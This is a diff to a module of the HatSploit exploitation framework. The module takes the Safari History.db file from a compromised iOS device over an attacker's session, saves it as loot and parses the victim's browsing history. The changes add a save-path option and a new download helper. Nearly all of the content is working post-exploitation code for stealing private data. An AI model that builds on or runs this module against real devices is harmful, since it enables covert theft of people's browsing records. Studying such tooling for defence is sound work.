@@ -6,8 +6,9 @@
 #
 
 from hatsploit.lib.module import Module
-
 from hatsploit.lib.sessions import Sessions
+from hatsploit.lib.loot import Loot
+
 from pex.tools.db import DBTools
 
 
@@ -30,20 +31,24 @@ class HatSploitModule(Module, Sessions, DBTools):
             'Value': None,
             'Type': "session",
             'Required': True
+        },
+        'PATH': {
+            'Description': "Path to save file.",
+            'Value': Loot().random_loot('db'),
+            'Type': None,
+            'Required': True
         }
     }
 
     def run(self):
-        session = self.parse_options(self.options)
+        session, path = self.parse_options(self.options)
+        history = '/private/var/mobile/Library/Safari/History.db'
 
-        history_path = '/private/var/mobile/Library/Safari/History.db'
-        local_path = self.session_download(session, history_path)
-
-        if local_path:
+        if self.download_from_session(session, history, path):
             self.print_process("Parsing history database...")
 
             try:
-                history = self.parse_safari_bookmarks(local_path + 'History.db')
+                history = self.parse_safari_bookmarks(path)
             except Exception:
                 self.print_error("Failed to parse history database!")
                 return
